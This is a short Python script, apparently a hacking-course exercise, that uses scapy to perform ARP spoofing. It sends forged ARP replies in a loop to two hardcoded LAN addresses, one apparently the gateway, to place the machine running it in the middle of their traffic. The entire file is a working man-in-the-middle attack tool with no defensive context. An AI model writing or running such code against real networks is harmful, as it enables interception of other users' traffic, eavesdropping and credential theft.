import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast= scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]


    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


sent_packets_count = 0
#implementint try/except
try:
    while True:
        spoof("192.168.100.2", "192.168.100.1")
        spoof("192.168.100.1", "192.168.100.2")
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Sent two packets" + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ... Quitting...")
